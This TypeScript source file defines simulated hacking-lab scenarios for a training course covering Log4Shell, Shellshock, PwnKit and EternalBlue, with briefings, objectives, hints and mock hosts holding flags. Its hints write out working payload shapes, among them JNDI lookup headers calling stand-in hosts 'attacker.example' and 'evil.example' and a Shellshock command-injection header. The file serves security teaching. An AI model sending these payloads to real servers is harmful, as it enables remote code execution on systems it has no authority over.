import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

export const intenseRealWorldLabs: LabScenario[] = [
  {
    id: 'log4shell-jndi-rce',
    title: 'CVE-2021-44228: Log4Shell JNDI Injection',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Meridian Analytics runs an internal dashboard (10.10.106.1) built on a Java stack using a vulnerable ' +
      'logging library. Whatever string you send as your User-Agent gets logged verbatim — and if that ' +
      'library evaluates JNDI lookup syntax inside logged strings, an attacker-controlled User-Agent header ' +
      'becomes remote code execution. This recreates the mechanics of the real Log4Shell vulnerability ' +
      '(CVE-2021-44228), one of the most severe RCEs ever disclosed, without needing a real LDAP server.',
    objectives: [
      { text: 'Scan 10.10.106.1 and identify the web service', why: 'Confirms the target and port before you start crafting payloads against it.' },
      { text: 'Send a baseline request and confirm the User-Agent header is reflected/logged', why: 'You need to know the app actually processes your header before assuming it\'s exploitable.' },
      {
        text: 'Send a JNDI lookup payload as the User-Agent: curl -H "User-Agent: ${jndi:ldap://attacker.example/a}" 10.10.106.1/',
        why: 'This is the exact payload shape that made Log4Shell so dangerous — the vulnerable logging library evaluates ${jndi:...} syntax found INSIDE any string it logs, not just in application input fields, meaning literally any logged header, username, or form field could trigger it.',
      },
    ],
    hints: [
      'nmap -sV 10.10.106.1 to confirm the web service and version banner.',
      'curl -H "User-Agent: test" 10.10.106.1/  — a normal request, to see the app respond normally first.',
      'The vulnerable pattern is ${jndi:ldap://<anything>/<anything>} — try: curl -H "User-Agent: ${jndi:ldap://evil.example/a}" 10.10.106.1/',
      'Real-world Log4Shell payloads triggered an outbound LDAP connection to an attacker-controlled server, which then served a malicious Java class — this lab simulates the successful trigger without needing that infrastructure.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'analytics-dash', ip: '10.10.106.1', os: 'Ubuntu 20.04 (Java/Spring stack)',
        services: [{
          port: 80, name: 'http', version: 'Apache Tomcat 9.0.31 (log4j-core 2.14.1)',
          http: { '/': '<html><body><h1>Meridian Analytics Dashboard</h1><p>Internal use only.</p></body></html>' },
          vulnRoutes: [{
            kind: 'ssrf', path: '/', param: 'user-agent', location: 'header',
            triggerSubstrings: ['${jndi:', 'jndi:ldap', 'jndi:rmi'],
            vulnerableResponse:
              '<html><body><h1>Meridian Analytics Dashboard</h1></body></html>\n' +
              '[log4j2] JNDI lookup triggered from logged User-Agent header\n' +
              '[log4j2] Outbound LDAP reference resolved — remote class loading simulated\n' +
              'flag{log4shell_jndi_lookup_in_logged_header}',
            normalResponse: '<html><body><h1>Meridian Analytics Dashboard</h1></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'shellshock-cgi-rce',
    title: 'CVE-2014-6271: Shellshock CGI Injection',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Oldstone Logistics still runs a legacy CGI script (10.10.106.2) on an unpatched bash. Bash versions ' +
      'vulnerable to Shellshock execute trailing commands appended after a specially-crafted function ' +
      'definition stored in an environment variable — and CGI scripts pass HTTP headers like User-Agent ' +
      'directly into environment variables. This recreates the real CVE-2014-6271 exploitation pattern.',
    objectives: [
      { text: 'Scan 10.10.106.2 and identify the legacy CGI web service', why: 'Old CGI-based apps (as opposed to modern frameworks) are exactly where Shellshock exploitation was found in the wild for years after the patch was available.' },
      { text: 'Send a normal request to /cgi-bin/status to see expected behavior', why: 'Establishes what "normal" looks like before you send the malicious header.' },
      {
        text: 'Send the Shellshock payload as User-Agent: curl -H "User-Agent: () { :; }; echo VULNERABLE" 10.10.106.2/cgi-bin/status',
        why: 'The "() { :; };" part is a function definition bash never finishes parsing correctly on vulnerable versions — anything typed after that semicolon executes as a real shell command, not just a header value. This exact payload shape was used against real unpatched servers within hours of the CVE\'s public disclosure in 2014.',
      },
    ],
    hints: [
      'nmap -sV 10.10.106.2',
      'curl 10.10.106.2/cgi-bin/status  for a baseline response.',
      'curl -H "User-Agent: () { :; }; echo VULNERABLE" 10.10.106.2/cgi-bin/status',
      'The "() { :; };" prefix is the Shellshock trigger — everything after the trailing semicolon runs as a shell command on a vulnerable bash.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'legacy-cgi', ip: '10.10.106.2', os: 'CentOS 6 (bash 4.1, unpatched)',
        services: [{
          port: 80, name: 'http', version: 'Apache httpd 2.2.15 (mod_cgi)',
          http: { '/cgi-bin/status': 'Status: OK\nUptime: 412 days\n' },
          vulnRoutes: [{
            kind: 'ssrf', path: '/cgi-bin/status', param: 'user-agent', location: 'header',
            triggerSubstrings: ['() { :;', '(){:;', '() {:;'],
            vulnerableResponse:
              'Status: OK\nUptime: 412 days\n' +
              '--- CGI passed header through bash unsafely ---\n' +
              'VULNERABLE\n' +
              'flag{shellshock_bash_function_definition_escape}',
            normalResponse: 'Status: OK\nUptime: 412 days\n',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'pwnkit-polkit-privesc',
    title: 'CVE-2021-4034: PwnKit Local Privilege Escalation',
    difficulty: 'Medium',
    category: 'Linux',
    briefing:
      'You have a low-privilege shell on 10.10.106.3. The polkit pkexec binary on this host is vulnerable ' +
      'to CVE-2021-4034 ("PwnKit") — a memory-corruption bug in how pkexec handles a missing argv[0], ' +
      'present in default installs of nearly every major Linux distribution for over a decade before ' +
      'disclosure in 2022. Any local user can use it to obtain a root shell, no password required.',
    objectives: [
      { text: 'Scan 10.10.106.3 and gain SSH access as "analyst" (weak/reused password)', why: 'PwnKit is a LOCAL privilege escalation — you need any shell first, even an unprivileged one.' },
      { text: 'Confirm pkexec is present and SUID root with: find / -perm -4000 2>/dev/null', why: 'pkexec ships SUID root by default on almost every distribution — that\'s exactly what makes CVE-2021-4034 so widely impactful.' },
      { text: 'Trigger the PwnKit exploit by running /usr/bin/pkexec directly', why: 'The real exploit crafts a malicious shared library and manipulates argv/envp to make pkexec load attacker-controlled code — this lab simplifies the trigger to running the binary itself, the same abstraction used for the GTFOBins-style labs earlier in this course.' },
    ],
    hints: [
      'nmap -sV 10.10.106.3',
      'ssh analyst@10.10.106.3 — try common weak passwords, or check for leaked creds first with curl 10.10.106.3/robots.txt.',
      "find / -perm -4000 2>/dev/null will show /usr/bin/pkexec as SUID root.",
      '/usr/bin/pkexec  — running it directly triggers the simulated CVE-2021-4034 exploit in this lab.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'legacy-workstation', ip: '10.10.106.3', os: 'Ubuntu 20.04 (polkit 0.105, unpatched)',
        services: [
          { port: 22, name: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu-4ubuntu0.5' },
          { port: 80, name: 'http', version: 'nginx 1.18.0', http: { '/robots.txt': 'User-agent: *\nDisallow: /internal-analyst-notes\n' } },
        ],
        users: [{ username: 'analyst', password: 'letmein123' }],
        suidBinary: '/usr/bin/pkexec',
        root: dir({
          home: dir({ analyst: dir({ 'user.txt': file('Weak SSH password confirmed via brute-forceable login.\nflag{weak_ssh_password_analyst_account}\n') }) }),
          root: dir({ 'root.txt': file('CVE-2021-4034 (PwnKit) strikes again — a decade-old default install, exploitable with zero patches applied.\nflag{pwnkit_cve_2021_4034_root}\n') }),
          usr: dir({ bin: dir({ pkexec: file('ELF binary (SUID root) — polkit 0.105', '-rwsr-xr-x') }) }),
        }),
      } as HostDef,
    ],
  },
  {
    id: 'eternalblue-smb-rce',
    title: 'MS17-010: EternalBlue SMBv1 Remote Code Execution',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'Northbridge Manufacturing never patched a Windows 7 file server (10.10.106.4). It\'s still running ' +
      'SMBv1 with the MS17-010 vulnerability unpatched — the exact flaw exploited by EternalBlue, the NSA-' +
      'developed exploit later leaked and weaponized in the WannaCry and NotPetya ransomware outbreaks that ' +
      'caused billions of dollars in damage worldwide in 2017.',
    objectives: [
      { text: 'Scan 10.10.106.4 with nmap -sV and identify the SMB version', why: 'EternalBlue only works against unpatched SMBv1 — version fingerprinting is how you confirm the target before firing an exploit that could crash an unpatched, fragile legacy service.' },
      { text: 'Launch the exploit: exploit ms17_010_eternalblue 10.10.106.4', why: 'In a real engagement this would be run through a framework like Metasploit — the module name and target IP are exactly what an operator supplies to trigger it.' },
      { text: 'Confirm the resulting session runs as SYSTEM and read the flag', why: 'EternalBlue doesn\'t just get you a user shell — the SMB kernel-level bug grants SYSTEM directly, the highest privilege on Windows, in a single step with no separate privilege escalation phase needed.' },
    ],
    hints: [
      'nmap -sV 10.10.106.4 — look for an old SMB version number on port 445.',
      'This host is vulnerable to MS17-010. The module name for this lab is exactly: ms17_010_eternalblue',
      'exploit ms17_010_eternalblue 10.10.106.4',
      'Once the session opens you are SYSTEM — check /root/root.txt (this lab treats the SYSTEM home as /root for simplicity).',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'FILESRV-LEGACY', ip: '10.10.106.4', os: 'Windows 7 Enterprise SP1 (unpatched, no MS17-010)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMBv1 (Windows 7 SP1, MS17-010 unpatched)' }],
        users: [],
        exploitableAs: 'ms17_010_eternalblue',
        root: dir({ root: dir({ 'root.txt': file('EternalBlue (MS17-010) confirmed — the same flaw behind WannaCry and NotPetya.\nflag{eternalblue_ms17_010_system_shell}\n') }) }),
      } as HostDef,
    ],
  },
];
